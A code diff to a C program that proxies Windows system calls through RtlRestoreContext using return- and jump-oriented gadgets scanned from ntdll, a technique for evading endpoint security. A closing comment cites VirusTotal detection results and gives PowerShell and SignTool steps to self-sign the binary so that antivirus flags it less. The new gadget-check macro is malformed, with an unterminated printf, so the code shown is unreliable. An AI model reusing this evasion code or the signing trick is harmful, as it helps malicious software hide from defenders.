@@ -8,6 +8,16 @@
 #define FULL_STUB_SIZE	32
 #define DWORD_MAX		0xFFFFFFFFUL
 #define FRAMES			2
+#define CHECK_GADGET(name, gadget)                                      \
+    do {                                                                \
+        if (!(gadget)) {                                                \
+			printf("[+] %s gadget located at 0x%p\n", (name),			\
+            return -1;                                                  \
+        } 																\
+		else {                                                        	\
+	printf("[+] %s gadget located at 0x%p\n", (name),(void*)(gadget));	\
+        }                                                               \
+    } while (0)
 
 typedef struct _LSA_UNICODE_STRING{
 	USHORT Length;
@@ -268,7 +278,7 @@ bool AnotherGate(	DWORD SyscallServiceNumber,
 		Triggered = !Triggered;
 		asm volatile ("mov %%rax, %0" : "=r"(ReturnValue));
 		if(!ReturnValue){
-			puts("[+] Successfully proxied syscall through RtlRestoreContext!");
+			puts("[+] Hip hip Horray!");
 			return true;
 		}
 		printf("[-] An error in calling the proxied syscall has occured 0x%llX\n", ReturnValue);
@@ -334,50 +344,19 @@ int main(void){
 	PIMAGE_OPTIONAL_HEADER OptionalHeader	= (PIMAGE_OPTIONAL_HEADER)((PBYTE)FileHeader + sizeof(IMAGE_FILE_HEADER));
 	PIMAGE_EXPORT_DIRECTORY ExportDirectory	= (PIMAGE_EXPORT_DIRECTORY)(NtdllBaseAddress + OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 
+	GadgetArray.ret							= (DWORD64)pattern_scan(ret_g, RET_SIZE, (HMODULE)NtdllBaseAddress);
 	GadgetArray.jmp_rcx 					= (DWORD64)pattern_scan(jmp_rcx_g, JOP_SIZE, (HMODULE)NtdllBaseAddress);
 	GadgetArray.jmp_rax 					= (DWORD64)pattern_scan(jmp_rax_g, JOP_SIZE, (HMODULE)NtdllBaseAddress);
 	GadgetArray.add_rsp 					= (DWORD64)pattern_scan(add_rsp_216_g, ADD_RSP_SIZE, (HMODULE)NtdllBaseAddress);
-	GadgetArray.ret							= (DWORD64)pattern_scan(ret_g, RET_SIZE, (HMODULE)NtdllBaseAddress);
 	GadgetArray.pop_rdx_rcx_r8_r9_r10_r11	= (DWORD64)pattern_scan(pop_rdx_rcx_r8_r9_r10_r11_g, POP_SIZE, (HMODULE)NtdllBaseAddress);
-	if(!GadgetArray.jmp_rcx){
-		puts("[-] Unable to locate jmp_rcx Gadgets!!");
-		return -1;
-	}
-	else{
-		printf("[+] jmp_rcx Gadget located at 0x%p\n", (void*)GadgetArray.jmp_rcx);
-	}
-	
-	if(!GadgetArray.jmp_rax){
-		puts("[-] Unable to locate jmp_rax Gadgets!!");
-		return -1;
-	}
-	else{
-		printf("[+] jmp_rax Gadget located at 0x%p\n", (void*)GadgetArray.jmp_rax);
-	}
-	
-	if(!GadgetArray.pop_rdx_rcx_r8_r9_r10_r11){
-		puts("[-] Unable to locate pop_rdx_rcx_r8_r9_r10_r11 Gadgets");
-		return -1;
-	}
-	else{
-		printf("[+] pop_rdx_rcx_r8_r9_r10_r11 located at 0x%p\n", (void*)GadgetArray.pop_rdx_rcx_r8_r9_r10_r11);
-	}
-	
-	if(!GadgetArray.add_rsp){
-		puts("[-] Unable to locate add_rsp_216 Gadgets");
-		return -1;
-	}
-	else{
-		printf("[+] add_rsp_216 Gadget located at 0x%p\n", (void*)GadgetArray.add_rsp);
-	}
 
-	if(!GadgetArray.ret){
-		puts("[-] Unable to locate ret gadget");
-		return -1;
-	}
-	else{
-		printf("[+] ret Gadget located at 0x%p\n", (void*)GadgetArray.ret);
-	}
+	CHECK_GADGET("0", 						GadgetArray.ret);
+	CHECK_GADGET("0", 					GadgetArray.jmp_rcx);
+	CHECK_GADGET("0", 					GadgetArray.jmp_rax);
+	CHECK_GADGET("0", 					GadgetArray.add_rsp);
+	CHECK_GADGET("0",	GadgetArray.pop_rdx_rcx_r8_r9_r10_r11);
+
+	
 	dynamic_ssn_retrieval(	fn1va(NtVirtualAllocate), 
 							CheckSum, 
 							ExportDirectory, 
@@ -411,4 +390,16 @@ int main(void){
 	}
 	return 0;
 }
-/* gcc main.c -pedantic -Wall -Werror -o sol */
+/* 
+gcc main.c -pedantic -Wall -Werror -o sol && sol.exe
+
+The results are here https://www.virustotal.com/gui/file/87b6b2d5ebfc070d14df48b5728f89a19fbc9779aa52f50f84afd39fbb25c48a
+
+Keep in mind you do have to sign this file otherwise the false positives are insane
+\___For instance https://www.virustotal.com/gui/file/f1545e4626b9539b5b0851f6cf40d0cfc5a3b5fd8edacc261b18cd971c4676ba is a normal file with insane detection
+
+$cert = New-SelfSignedCertificate -Type Custom -KeyUsage DigitalSignature -CertStoreLocation "."-Subject "CN=Is your teen spirit up??" -FriendlyName "Howdy im just a teen programmer"
+$pwd = ConvertTo-SecureString -String "MyPfxPassword123!" -Force -AsPlainText
+Export-PfxCertificate -Cert $cert -FilePath "localhost.pfx" -Password $pwd
+SignTool sign /f "localhost.pfx" /p "MyPfxPassword123!" /fd SHA256 /t "http://timestamp.digicert.com" "sol.exe"
+*/
